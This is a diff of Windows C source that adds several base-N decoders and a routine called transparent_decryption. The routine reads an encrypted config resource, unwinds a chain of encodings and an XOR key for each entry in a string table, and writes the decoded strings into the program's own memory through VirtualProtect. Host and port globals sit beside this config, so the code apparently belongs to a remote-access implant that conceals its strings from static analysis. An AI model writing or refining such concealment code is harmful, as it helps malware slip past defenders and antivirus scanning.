@@ -22,6 +22,99 @@ char* base64_encode(const unsigned char* data, size_t input_length, size_t* outp
     return out;
 }
 
+unsigned char* base32_decode(const char* data, size_t input_length, size_t* output_length) {
+    static const signed char table[256] = {
+        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
+        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
+        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
+        -1,-1,26,27,28,29,30,31, -1,-1,-1,-1,-1,-1,-1,-1,
+        -1, 0, 1, 2, 3, 4, 5, 6,  7, 8, 9,10,11,12,13,14,
+        15,16,17,18,19,20,21,22, 23,24,25,-1,-1,-1,-1,-1,
+        -1, 0, 1, 2, 3, 4, 5, 6,  7, 8, 9,10,11,12,13,14,
+        15,16,17,18,19,20,21,22, 23,24,25,-1,-1,-1,-1,-1
+    };
+    size_t out_len = (input_length * 5) / 8;
+    unsigned char* out = (unsigned char*)malloc(out_len + 1);
+    if (!out) return NULL;
+    memset(out, 0, out_len + 1);
+
+    uint32_t buffer = 0;
+    int bits = 0;
+    size_t count = 0;
+    for (size_t i = 0; i < input_length; i++) {
+        signed char val = table[(unsigned char)data[i]];
+        if (val == -1) continue;
+        buffer = (buffer << 5) | val;
+        bits += 5;
+        if (bits >= 8) {
+            out[count++] = (buffer >> (bits - 8)) & 0xFF;
+            bits -= 8;
+        }
+    }
+    if (output_length) *output_length = count;
+    return out;
+}
+
+unsigned char* base16_decode(const char* data, size_t input_length, size_t* output_length) {
+    size_t out_len = input_length / 2;
+    unsigned char* out = (unsigned char*)malloc(out_len + 1);
+    if (!out) return NULL;
+    for (size_t i = 0; i < out_len; i++) {
+        char s[3] = {data[i*2], data[i*2+1], 0};
+        out[i] = (unsigned char)strtol(s, NULL, 16);
+    }
+    out[out_len] = 0;
+    if (output_length) *output_length = out_len;
+    return out;
+}
+
+static void bn_mul_add(unsigned char* bn, size_t bn_len, int base, int val) {
+    uint32_t carry = val;
+    for (int i = (int)bn_len - 1; i >= 0; i--) {
+        uint32_t res = (uint32_t)bn[i] * base + carry;
+        bn[i] = (unsigned char)(res & 0xFF);
+        carry = res >> 8;
+    }
+}
+
+unsigned char* baseN_decode(const char* data, size_t input_length, size_t* output_length, const char* alphabet, int base) {
+    size_t bn_len = (input_length * 8) / 7 + 2; // Rough upper bound
+    unsigned char* bn = (unsigned char*)malloc(bn_len);
+    if (!bn) return NULL;
+    memset(bn, 0, bn_len);
+
+    for (size_t i = 0; i < input_length; i++) {
+        const char* p = strchr(alphabet, data[i]);
+        if (!p) continue;
+        bn_mul_add(bn, bn_len, base, (int)(p - alphabet));
+    }
+
+    // Leading zeros
+    size_t leading = 0;
+    for (size_t i = 0; i < input_length; i++) {
+        if (data[i] == alphabet[0]) leading++;
+        else break;
+    }
+
+    size_t start = 0;
+    while (start < bn_len && bn[start] == 0) start++;
+
+    size_t final_len = (bn_len - start) + leading;
+    unsigned char* out = (unsigned char*)malloc(final_len + 1);
+    if (!out) {
+        free(bn);
+        return NULL;
+    }
+    memset(out, 0, leading);
+    if (bn_len > start) {
+        memcpy(out + leading, bn + start, bn_len - start);
+    }
+    out[final_len] = 0;
+    if (output_length) *output_length = final_len;
+    free(bn);
+    return out;
+}
+
 unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
     DWORD out_len = 0;
     if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
@@ -292,7 +385,7 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
 char g_host[256] = {0};
 int g_port = 0;
 
-unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
+unsigned char g_xor_key[16] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
 
 void transparent_decryption() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
@@ -309,37 +402,75 @@ void transparent_decryption() {
 
     if (memcmp(pData, marker, 16) != 0) return;
 
-    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
-    // StringTableEntry: [RVA(4)][Len(4)]
+    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...][EncodedPool...]
+    // StringTableEntry: [RVA(4)][OrigLen(4)][EncLen(4)][PoolOffset(4)] = 16 bytes
 
     int num_strings = *(int*)(pData + 16 + 2032);
     if (num_strings <= 0) return;
 
     unsigned char* string_table = pData + 16 + 2032 + 4;
-    unsigned char key = g_xor_key[4];
-    if (key == 0) return; // Not obfuscated
+    unsigned char* pool = string_table + (num_strings * 16);
+
+    unsigned char xor_key = g_xor_key[4];
+    unsigned char* sequence = &g_xor_key[5];
 
     HMODULE hMod = GetModuleHandle(NULL);
     for (int i = 0; i < num_strings; i++) {
-        DWORD rva = *(DWORD*)(string_table + (i * 8));
-        DWORD len = *(DWORD*)(string_table + (i * 8) + 4);
+        DWORD rva = *(DWORD*)(string_table + (i * 16));
+        DWORD orig_len = *(DWORD*)(string_table + (i * 16) + 4);
+        DWORD enc_len = *(DWORD*)(string_table + (i * 16) + 8);
+        DWORD pool_offset = *(DWORD*)(string_table + (i * 16) + 12);
 
-        if (rva == 0 || len == 0 || len > 1024) continue;
+        if (rva == 0 || orig_len == 0 || enc_len == 0) continue;
 
+        unsigned char* encoded = pool + pool_offset;
+        unsigned char* current_data = (unsigned char*)malloc(enc_len + 1);
+        if (!current_data) continue;
+        memcpy(current_data, encoded, enc_len);
+        current_data[enc_len] = 0;
+        size_t current_len = enc_len;
+
+        // Apply decoders in REVERSE order of sequence
+        for (int j = 6; j >= 0; j--) {
+            unsigned char type = sequence[j];
+            unsigned char* next_data = NULL;
+            size_t next_len = 0;
+
+            switch (type) {
+                case 1: next_data = base64_decode((char*)current_data, current_len, &next_len); break;
+                case 2: next_data = base32_decode((char*)current_data, current_len, &next_len); break;
+                case 3: next_data = base16_decode((char*)current_data, current_len, &next_len); break;
+                case 4: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE58, 58); break;
+                case 5: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE62, 62); break;
+                case 6: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE85, 85); break;
+                case 7: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE91, 91); break;
+            }
+
+            if (next_data) {
+                free(current_data);
+                current_data = next_data;
+                current_len = next_len;
+            }
+        }
+
+        // Final XOR
+        for (size_t k = 0; k < current_len; k++) {
+            current_data[k] ^= xor_key;
+        }
+
+        // Patch back into memory
         unsigned char* addr = (unsigned char*)hMod + rva;
-
         MEMORY_BASIC_INFORMATION mbi;
         if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
             if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                 DWORD old_protect;
-                if (VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                    for (DWORD j = 0; j < len; j++) {
-                        addr[j] ^= key;
-                    }
-                    VirtualProtect(addr, len, old_protect, &old_protect);
+                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+                    memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
+                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
                 }
             }
         }
+        free(current_data);
     }
 }
 
